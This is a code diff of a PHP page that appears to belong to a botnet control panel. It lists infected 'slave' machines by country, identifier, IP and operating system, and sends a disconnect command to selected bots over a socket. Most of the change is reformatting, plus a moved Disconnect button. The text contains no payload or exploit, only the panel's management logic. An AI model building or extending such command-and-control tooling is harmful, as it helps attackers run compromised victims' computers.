@@ -6,14 +6,14 @@ require_once "request.php";
 $request = new Request();
 $sock = $request->createSocket();
 
-if (isset($_POST['select']) && isset($_POST['action'])) {
-	$action = $_POST['action'];
+if (isset($_POST['select']) && isset($_POST ['action'])) {
+	$action = $_POST ['action'];
 	
-	if ($action == "disconnect") {
+	if ($action == "Disconnect") {
 		$request->write($sock, 10);
-		$request->write($sock, count($_POST['select']));
+		$request->write($sock, count($_POST ['select']));
 	}
-	foreach ($_POST['select'] as $slave) {
+	foreach ( $_POST ['select'] as $slave ) {
 		$request->write($sock, $slave);
 	}
 } else {
@@ -22,7 +22,6 @@ if (isset($_POST['select']) && isset($_POST['action'])) {
 
 $slaves = $request->getSlaves($sock);
 $request->disconnect($sock);
-
 
 require "layout/header.php";
 
@@ -46,34 +45,38 @@ $(document).ready(function() {
 
 
 <section class="wrapper scrollable">
-<div class="col-md-12">
-<div class="panel panel-default panel-block">
-	<div class="list-group">
-		<div class="list-group-item">
-			<div class="form-group">
-				<h4 class="section-title">Bot List</h4>
-				<form method="POST">
-				<table class="table table-bordered table-striped">
-					<thead class="">
-						<tr>
-							<th>Country</th>
-							<th>Identifier</th>
-							<th>IP</th>
-							<th>Operating System</th>
-							<th></th>
-							<th><input type="checkbox" class="box" id="selectall"></th>
-							<th>
-						</tr>
-					</thead>
-					<tbody>
+	<div class="col-md-12">
+		<div class="panel panel-default panel-block">
+			<div class="list-group">
+				<div class="list-group-item">
+					<div class="form-group">
+						<form method="POST">
+
+							<h4 class="section-title">Bot List</h4>
+							<div class="form-group" align=right>
+								<button type="submit" name="action" value="Disconnect" class="btn btn-default">Disconnect</button>
+
+							</div>
+							
+							<table class="table table-bordered table-striped">
+								<thead class="">
+									<tr>
+										<th>Country</th>
+										<th>Identifier</th>
+										<th>IP</th>
+										<th>Operating System</th>
+										<th></th>
+										<th><input type="checkbox" class="box" id="selectall"></th>
+									</tr>
+								</thead>
+								<tbody>
 	
 					<?php
-
+					
 					function printTableData($s) {
 						echo "<td>" . $s . "</td>\n";
 					}
 					
-
 					$page = isset($_GET['page']) ? $_GET['page'] : "all";
 					
 					if ($page == 0) {
@@ -86,7 +89,7 @@ $(document).ready(function() {
 						$start = 0;
 						$max = count($slaves);
 					} else {
-						$page--;
+						$page --;
 						
 						$max = 10;
 						$start = $page * $max;
@@ -95,15 +98,15 @@ $(document).ready(function() {
 							$page = 0;
 						}
 					}
-												
-					for ($i = $start; $i < $start + $max; $i++) {
-						if (!isset($slaves[$i])) {
+					
+					for($i = $start; $i < $start + $max; $i ++) {
+						if (! isset($slaves [$i])) {
 							break;
 						}
-						$slave = $slaves[$i];
+						$slave = $slaves [$i];
 						
-						$displayed++;
-
+						$displayed ++;
+						
 						echo "<tr>\n";
 						echo printTableData($slave->getDisplayCountry());
 						echo printTableData($slave->getIdentifier());
@@ -117,28 +120,30 @@ $(document).ready(function() {
 					?>
 	
 					</tbody>
-				</table>
-				</form>
-				<div class="form-group" align="right">
-					<div>
-						<ul class="pagination pagination-demo">
-							<?php 				
+							</table>
+						</form>
+						<div class="form-group" align="right">
+							<div>
+
+								<ul class="pagination pagination-demo">
+						
+							<?php
 							if ($page != "all") {
-								$page++;
+								$page ++;
 							}
 							echo '<li><a href="bots.php?page=' . ($page - 1) . '">&laquo;</a></li>';
-							echo '<li><a href="bots.php?page=' . ($page) . '">' . ($page). '</a></li>';
+							echo '<li><a href="bots.php?page=' . ($page) . '">' . ($page) . '</a></li>';
 							echo '<li><a href="bots.php?page=' . ($page + 1) . '">&raquo;</a></li>';
 							?>
 							
 						</ul>
+							</div>
+						</div>
 					</div>
 				</div>
 			</div>
 		</div>
 	</div>
-</div>
-</div>
 </section>
 
 <?php 
